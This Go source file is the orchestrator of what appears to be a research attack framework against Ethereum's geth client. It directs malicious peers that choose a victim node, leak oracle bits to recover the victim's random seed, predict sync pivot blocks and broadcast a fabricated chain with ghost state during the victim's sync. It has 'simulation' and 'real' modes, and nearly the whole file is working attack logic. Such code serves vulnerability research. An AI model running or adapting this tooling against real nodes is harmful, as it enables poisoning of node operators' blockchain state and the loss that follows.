package orchestrator

import "fmt"
import "net"
import "time"
import "sync"
import "bytes"
import "math"
import "encoding/binary"
import "os"
import mrand "math/rand"
import dircopy "github.com/otiai10/copy"
import "github.com/ethereum/go-ethereum/rlp"
import "github.com/ethereum/go-ethereum/core/types"
import "github.com/ethereum/go-ethereum/attack/buildchain"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
	SEED_ADDR = "localhost"
)
var (
	port = "45678"
	seed_port = "65432"
	mgethDir string
)

type Orchestrator struct {
	peerset *PeerSet
	quitCh chan struct{}
	errc chan error
	incoming chan *peerMessage
	victim string
	oracleCh chan byte
	//oracleReply []byte
	attackPhase utils.AttackPhase
	chainBuilt bool
	localMaliciousPeers bool
	firstMasterSet bool
	mu sync.Mutex
	syncOps int
	syncCh chan struct{}
	syncChRead bool
	masterPeerSet bool
	predictionOnly bool
	requiredOracleBits int
	seed int32
	done chan struct{}
	rand *mrand.Rand
	prngSteps map[int]int
	prngTuned chan struct{}
	miningTime int
	fraction float64
	honestHashrate float64
	ghostAttack bool
	blockX int
	blockY int
	targetHead int
}

type OrchConfig struct {
	Rebuild bool
	Port string
	PredictionOnly bool
	ShortPrediction bool
	OverriddenSeed int
	AtkMode string
	MiningTime int
	Fraction float64
	HonestHashrate float64
	GhostAttack bool
}

func New(errc chan error) *Orchestrator {
	o := &Orchestrator {
		peerset: &PeerSet{
			peers: make(map[string]*Peer),
		},
		quitCh: make(chan struct{}),		// Useless (?) for now as termination upon success/fail is signaled
											// through errc channel
		errc: errc,
		incoming: make(chan *peerMessage),
		oracleCh: make(chan byte),
		attackPhase: utils.StalePhase,
		chainBuilt: false,
		localMaliciousPeers: true,
		firstMasterSet: false,
		syncOps: 0,
		syncCh: make(chan struct{}),
		syncChRead: false,
		masterPeerSet: false,
		predictionOnly: false,
		requiredOracleBits: utils.RequiredOracleBits,
		seed: int32(-1),
		done: make(chan struct{}),
		prngSteps: map[int]int{1:0, 100:0},
		prngTuned: make(chan struct{}),
	}

	return o
}

func (o *Orchestrator) Start(cfg *OrchConfig) {
	go o.handleMessages()
	go o.addPeers(cfg.Port)
	go func() {
		predictionChainLength := utils.NumBatchesForPrediction*utils.BatchSize + 88
		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, cfg.Rebuild, 0, false, false, nil)
		if err != nil {
			o.errc <- err
			o.close()
			return
		}
		o.chainBuilt = true
	}()

	o.predictionOnly = cfg.PredictionOnly

	if cfg.ShortPrediction {
		o.requiredOracleBits = 3
		o.seed = int32(1)
	}

	if cfg.OverriddenSeed >= 0 {
		o.seed = int32(cfg.OverriddenSeed)
	}

	if o.localMaliciousPeers {
		//TODO: Start two peers with 'mgeth'
	}

	if cfg.AtkMode=="real" {
		buildchain.SetRealMode()
	} else if cfg.AtkMode!="simulation" {
		o.errc <- fmt.Errorf("Invalid attack mode: %s", cfg.AtkMode)
		return
	}

	o.fraction = cfg.Fraction
	o.honestHashrate = cfg.HonestHashrate
	o.miningTime = cfg.MiningTime

	o.ghostAttack = cfg.GhostAttack

	fmt.Println("Orchestrator started")
}

func (o *Orchestrator) addPeers(port string) {
	l, err := net.Listen("tcp", ADDR+":"+port)
	if err != nil {
		fmt.Println("Error listening on the network")
		o.errc <- err
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting new connection\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		buf := make([]byte, 8)
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error receiving peer's ID\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		peerId := string(buf[:])
		peer := &Peer {
			id: peerId,
			conn: conn,
			stop: make(chan struct{}),
		}

		o.peerset.add(peerId, peer)
		fmt.Println("Peer " + peerId + " joined (numPeers:", o.peerset.len(), "\b)")

		//peer.distributeChain(utils.PredictionChain)

		go func() {
			peer.readLoop(o.incoming, o.quitCh, o.errc)
			o.peerset.remove(peerId)
		}()
		
		err = o.initPeer(peer)
		if err != nil {
			fmt.Println("Could not initialize peer correctly")
			o.peerset.remove(peerId)
			continue
		}
		err = o.sendAll(msg.NewMaliciousPeer.SetContent([]byte(peerId)))
		if err != nil {
			fmt.Println("Could not notify new peer to already connected peers")
			o.close()
			o.errc <- err
			return
		}

		/*
		Here, we arbitrarily choose to make the attack start after bootingTime seconds from when the two
		malicious peers are ready. In other words, the attacker doesn't look for a victim in the first
		bootingTime seconds. This simulates the fact that a real attacker has its Ethereum nodes in
		standard operation and at some point, later on, he switches them to "attack mode".
		When this happens, one of the two will stop accepting new peers from the network until a victim
		is picked: this is another reason why we want to keep both nodes in "normal operation" at the
		beginning, i.e. to establish some peering connections to other honest nodes.
		*/
		bootingTime := 30*time.Second
		if o.peerset.len() >= 2 && o.attackPhase==utils.StalePhase && o.chainBuilt {
			go func() {
				time.Sleep(bootingTime)
				o.attackPhase = utils.ReadyPhase
				err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
				if err != nil {
					fmt.Println("Could not notify start of the attack")
					o.close()
					o.errc <- err
					return
				}
				randPeer := o.peerset.randGet()
				err = o.sendAllExcept(msg.AvoidVictim.SetContent([]byte{1}), randPeer)
				if err != nil {
					fmt.Println("Could not set avoidVictim")
					o.close()
					o.errc <- err
					return
				}
				o.leadAttack()
			}()
		}
	}

}

func (o *Orchestrator) leadAttack() {
	//TODO: start leadAttack() immediately and wait here for the two peers
	fmt.Println("Attack ready to go")
	defer o.close()

	var oracleReply []byte
	for {
		bit := <-o.oracleCh
		oracleReply = append(oracleReply, bit)
		fmt.Printf("Received new oracle bit (#%d): %d\n", len(oracleReply), bit)
		
		if len(oracleReply) == o.requiredOracleBits - 1 {		// We got all but one oracle bits, so we notify
																// the peers that they are now leaking the last one.
																// However, we notify this only after one has been
																// chosen as master peer, to ease phase transition.
																// For the same goal, we relay the SetVictim message
																// only after LastOracleBit has been sent.
			for {
				if o.syncOps == o.requiredOracleBits {
					break
				}
				time.Sleep(100*time.Millisecond)
				//fmt.Println("Sleeping...")
			}
			o.sendAll(msg.LastOracleBit)

			//fmt.Println("Writing to o.syncCh")
			o.syncCh <- struct{}{}
			//fmt.Println("Wrote to o.syncCh")
		}
		if len(oracleReply)==o.requiredOracleBits {
			fmt.Println("Leaked bitstring:", oracleReply)

			if o.seed < 0 {
				seed, err := recoverSeed(oracleReply)
				if err != nil {
					fmt.Println("Could not recover seed")
					o.errc <- err
					return
				}
				fmt.Println("Recovered seed:", seed)
				o.seed = seed
			} else {
				fmt.Println("Using overridden seed", o.seed)
			}

			break
		}
	}

	if o.predictionOnly {
		o.errc <- nil
		return
	}

	o.rand = mrand.New(mrand.NewSource(int64(o.seed)))

	// Step forward the PRNG to account for calls to it during the prediction phase
	go func() {
		for i := 0; i < 2*utils.NumBatchesForPrediction*o.requiredOracleBits; i++ {
			r := o.rand.Intn(100)
			o.prngSteps[100]++
			// Print a few values for testing
			if i < 2 {
				fmt.Print(r, " ")
			}
		}
		fmt.Println("")
	}()

	o.syncCh <- struct{}{}	// Announce PRNG has been initialised

	<-o.syncCh				// Wait for blockX, blockY to be found
	fmt.Printf("Found x, y = %d, %d\n", o.blockX, o.blockY)
	fmt.Println("Set target head:", o.targetHead)

	<-o.syncCh				// Wait for first syncOp of sync phase to start
	/*
	o.attackPhase = utils.SyncPhase
	fmt.Println("Started", o.attackPhase, "phase")
	*/



	// --- SYNC PHASE ---

	/*
	// Wait for the master peer which will commit the ghost trie root before asking
	// the master for its working directory
	for o.syncOps != o.requiredOracleBits + 2 {
		time.Sleep(5*time.Second)
	}
	*/
	
	err := o.send(o.peerset.masterPeer, msg.GetCwd)
	if err != nil {
		fmt.Println("Couldn't get current working directory of master peer")
		o.errc <- err
		return
	}

	fmt.Println("Stepping done")

	// TODO: Tune the PRNG

	//<-o.prngTuned

	/*
	// Now, account for next 11 honest batches
	fmt.Println("Accounting for 11 repeated batches")
	for i := 0; i < 2*11; i++ {
		fmt.Printf("%d ", o.rand.Intn(100))
		o.prngSteps[100]++
	}
	fmt.Println("")
	*/


	if o.honestHashrate >= 0 {
		buildchain.SetHashrateLimit(int64(math.Round(o.fraction * o.honestHashrate)))
		fmt.Println("Simulating f =", o.fraction)
	} else {
		buildchain.SetHashrateLimit(-1)
	}
	// We change bp only for testing purposes. Remove the line below later on.
	bp := buildchain.GenerateBuildParameters(o.blockX, o.blockY, o.targetHead, o.miningTime)
	//bp := buildchain.BuildParametersForTesting(o.blockX, o.blockY, o.targetHead)

	buildchain.SetSeals(bp.SealsMap)
	buildchain.SetTimestampDeltas(bp.TimestampDeltasMap)


	errc := make(chan error)
	results := make(chan types.Blocks)
	go func() {
		// Wait for ghost root to be set and peer database to be copied to buildchain,
		// before we start mining.
		<-o.syncCh
		<-o.syncCh
		errc <- buildchain.BuildChain(utils.FakeChain, utils.BatchSize - o.blockX - 1 + utils.MinFullyVerifiedBlocks,
									  false, 0, o.ghostAttack, false, results) 
	}()

	loop:
	for {
		select {
		case result := <-results:
			errb := o.broadcastFakeBatch(result)
			if errb != nil {
				o.errc <- errb
				return
			}
		case err := <-errc:
			if err != nil {
				fmt.Println("Couldn't build fake chain")
				o.errc <- err
				return
			}
			break loop
		}
	}
	select {
		case result := <-results:
			errb := o.broadcastFakeBatch(result)
			if errb != nil {
				o.errc <- errb
				return
			}
		default:
	}
	close(results)
	close(errc)

	err = o.sendAll(msg.FakeBatch.SetContent(nil))
	if err != nil {
		fmt.Println("Couldn't notify end of fake batches")
		o.errc <- err
		return
	}

	<-o.done 	// Wait for the attack to finish



	// --- DELIVERY PHASE ---

	o.errc <- nil
}

func recoverSeed(bitstring []byte) (int32, error) {
	leadingZeroes := 8 - len(bitstring)%8
	padding := make([]byte, leadingZeroes)
	bitstring = append(padding, bitstring...)

	keyLength := len(bitstring) / 8
	var key []byte
	for i:=0; i < keyLength; i++ {
		sum := byte(0)
		for j:=0; j < 8; j++ {
			idx := 8*i + j
			sum *= 2
			if bitstring[idx] == byte(1) {
				sum += 1
			}
		}
		key = append(key, sum)
	}

	conn, err := net.Dial("tcp", SEED_ADDR+":"+seed_port)
	if err != nil {
		fmt.Println("Could not connect to seed recovery server")
		return -1, err
	}
	defer conn.Close()

	n, err := conn.Write(key)
	if err != nil {
		fmt.Println("Could not send key to seed recovery server")
		return -1, err
	}
	if n != keyLength {
		fmt.Println("Could not send full key to seed recovery server")
		return -1, utils.PartialSendErr
	}

	buf := make([]byte, utils.SeedSize)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("Could not receive seed from seed recovery server")
		return -1, err
	}
	if n != utils.SeedSize {
		fmt.Println("Could not receive full seed from seed recovery server")
		return -1, utils.PartialRecvErr
	}

	bufReader := bytes.NewReader(buf)
	var seed int32
	err = binary.Read(bufReader, binary.BigEndian, &seed)
	if err != nil {
		fmt.Println("Could not decode seed from bytes to int32")
		return -1, err
	}
	if seed < 0 {
		fmt.Println("Received seed is negative")
		return seed, utils.ParameterErr
	}
	return seed, nil
}

func getOptimizeScriptPath() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	pathSeparator := string(os.PathSeparator)
	path := home + pathSeparator + "scripts" + pathSeparator + "optimization.py"
	return path, nil
}

func (o *Orchestrator) broadcastFakeBatch(blocks types.Blocks) error {
	rlpBlocks, err := rlp.EncodeToBytes(blocks)
	if err != nil {
		fmt.Printf("Couldn't RLP-encode fake batch #%d - #%d\n", blocks[0].NumberU64(), blocks[len(blocks)-1].NumberU64())
		return err
	}
	content := make([]byte, 4)
	binary.BigEndian.PutUint32(content, uint32(len(blocks)))
	content = append(content, rlpBlocks...)
	err = o.sendAll(msg.FakeBatch.SetContent(content))
	if err != nil {
		fmt.Println("Couldn't broadcast fake batch to malicious peers")
		return err
	}
	return nil
}

func (o *Orchestrator) handleMessages() {
	for {
		select {
		case <- o.quitCh:
			return

		case peermsg := <-o.incoming:
			message := peermsg.message
			sender := peermsg.peer
			//fmt.Println("New message, code:", message.Code)

			switch message.Code {
			case msg.BatchRequestServed.Code:
				go func() {
					err := o.send(o.peerset.masterPeer, message)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.MasterPeer.Code:
				o.peerset.masterPeer = sender
				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
				o.syncOps++
				o.masterPeerSet = true
			case msg.SetVictim.Code:
				o.masterPeerSet = false
				victimID := string(message.Content)
				if o.victim == "" {
					o.victim = victimID
					fmt.Println("Found new victim: " + victimID)
				} else if o.victim != victimID {
					fmt.Println("Something wrong happened setting victim ID: oldID = " + o.victim + ", newID = "+ victimID)
					o.errc <- utils.ParameterErr
					o.close()
					return
				}
				go func() {
					for !o.masterPeerSet {
						time.Sleep(10*time.Millisecond)
					}
					if o.syncOps == o.requiredOracleBits {
						<-o.syncCh
					} else if o.syncOps == o.requiredOracleBits+1 {
						o.syncCh <- struct{}{}
					}
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.SetAttackPhase.Code:
				attackPhase := utils.AttackPhase(message.Content[0])
				if attackPhase != o.attackPhase {
					o.attackPhase = attackPhase
					fmt.Println("Started", o.attackPhase, "phase")
				}
				err := o.sendAllExcept(message, sender)
				if err != nil {
					o.errc <- err
					o.close()
					return
				}
			case msg.OracleBit.Code:
				o.oracleCh <- message.Content[0]

			case msg.ServeLastFullBatch.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.AnnouncedSyncTd.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.Rollback.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.TerminatingStateSync.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.InfoPRNG.Code:
				steps_1 := int(binary.BigEndian.Uint32(message.Content[:4]))
				steps_100 := int(binary.BigEndian.Uint32(message.Content[4:]))
				go func() {
					for i:=0; i < steps_100; i++ {
						o.rand.Intn(100)
						o.prngSteps[100]++
					}
					for i:=0; i < steps_1; i++ {
						o.rand.Intn(1)
						o.prngSteps[1]++
					}
					fmt.Printf("PRNG synced with victim (100: %d, 1: %d)\n", o.prngSteps[100], o.prngSteps[1])
					//o.prngTuned <- struct{}{}
				}()
			case msg.OriginalHead.Code:
				size := uint64(len(message.Content))
				s := rlp.NewStream(bytes.NewReader(message.Content), size)
				head := new(types.Header)
				if err := s.Decode(head); err != nil {
					fmt.Println("Couldn't decode original head")
					o.errc <- err
					o.close()
					return
				}
				buildchain.SetOriginalHead(head)
				go func() {
					height := head.Number.Uint64()
					fmt.Printf("Pre-building DAG at block #%d in background\n", height)
					err := buildchain.PrebuildDAG(height)
					if err != nil {
						fmt.Println("Pre-building DAG failed")
						o.errc <- err
						o.close()
						return
					}
					fmt.Printf("Pre-built DAG at block #%d\n", height)
				}()
				go func() {
					// Wait for the peer's working directory
					for !buildchain.MgethDirSet() {
						time.Sleep(time.Second)
					}

					// Wait for ghost root, otherwise peer's database may undergo write operations while
					// copying it to buildchain directory, resulting in an inconsistent state
					for !buildchain.GhostRootSet() {
						time.Sleep(time.Second)
					}
					time.Sleep(13*time.Second)			// Wait to make sure the ghost block has been written
														// into the peers' chain and the corresponding trie
														// root committed to the state, before copying their
														// database.

					separator := string(os.PathSeparator)
					srcPath := mgethDir + separator + "datadir" + separator + "geth" + separator + "chaindata"
					home, err := os.UserHomeDir()
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
					fakeChainDbPath := home + separator + ".buildchain" + separator + utils.FakeChain.GetDir()
					err = os.RemoveAll(fakeChainDbPath)
					if err != nil {
						fmt.Println("Couldn't clean fake chain DB directory")
						o.errc <- err
						o.close()
						return
					}
					err = dircopy.Copy(srcPath, fakeChainDbPath)
					if err != nil {
						fmt.Println("Couldn't copy peer's chaindata to buildchain directory")
						o.errc <- err
						o.close()
						return
					}
					fmt.Println("Peer's database copied into buildchain tool")
					o.syncCh <- struct{}{}		// Notify database has been copied
				}()
			case msg.Cwd.Code:
				mgethDir = string(message.Content)
				buildchain.SetMgethDir(mgethDir)
			case msg.GhostRoot.Code:
				buildchain.SetGhostRoot(message.Content)
				fmt.Println("Ghost root set")
				go func() {o.syncCh <- struct{}{}}()
			case msg.CurrentHead.Code:
				go func() {
					currentHead := int(binary.BigEndian.Uint64(message.Content))
					n := int(math.Ceil(float64(currentHead+60)/192.0)) + 1
					<-o.syncCh		// Wait for PRNG initialisation

					C := 10		// Force C > 10
					x := 0
					y := 0
					for i := 0; i < 2*n; i++ {
						o.rand.Intn(100)
					}
					for i := 0; i < 2*C; i++ {
						o.rand.Intn(100)
					}
					for (y >= 170 || y-x <= 160) {
						C++
						x = o.rand.Intn(100)
						y = 100 + o.rand.Intn(100)
					}
					o.blockX = x
					o.blockY = y
					o.targetHead = utils.BatchSize * (n-1) + x + 1
					o.syncCh <- struct{}{}

					content := make([]byte, 4)
					binary.BigEndian.PutUint32(content, uint32(C))
					err := o.sendAll(msg.SteppingBatches.SetContent(content))
					if err != nil {
						fmt.Println("Could not send number of stepping batches to peers")
						o.errc <- err
						o.close()
						return
					}
					content = make([]byte, 8)
					binary.BigEndian.PutUint64(content, uint64(o.targetHead))
					err = o.sendAll(msg.TargetHead.SetContent(content))
					if err != nil {
						fmt.Println("Could not send target head to peers")
						o.errc <- err
						o.close()
						return
					}
				}()


			// Default policy: relay the message among peers if no particular action by the orch is needed
			default:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			}
		}
	}
}

func (o *Orchestrator) Wait() {
	<-o.quitCh
	return
}

func (o *Orchestrator) initPeer (p *Peer) error {
	for id, _ := range o.peerset.peers {
		err := o.send(p, msg.NewMaliciousPeer.SetContent([]byte(id)))
		if err != nil {
			return err
		}
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
	err := o.send(p, msg.SetNumBatches.SetContent(buf))
	if err != nil {
			return err
		}

		/*
	o.mu.Lock()
	if o.firstMasterSet {
		err = o.send(p, msg.AvoidVictim.SetContent([]byte{1}))
	} else {
		o.firstMasterSet = true
	}
	o.mu.Unlock()
	*/
	return err
}

func (o *Orchestrator) send(p *Peer, message *msg.Message) error {
	buf := message.Encode()
	n, err := p.conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

func (o *Orchestrator) sendAllExcept(message *msg.Message, toExclude *Peer) error {
	for _, peer := range o.peerset.peers {
		if peer.id == toExclude.id {
			continue
		}
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) sendAll(message *msg.Message) error {
	for _, peer := range o.peerset.peers {
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) close() {
	o.sendAll(msg.Terminate)
	close(o.quitCh)
	close(o.incoming)
	close(o.done)
	o.peerset.close()
	return
}

func (o *Orchestrator) Close() {
	o.close()
}


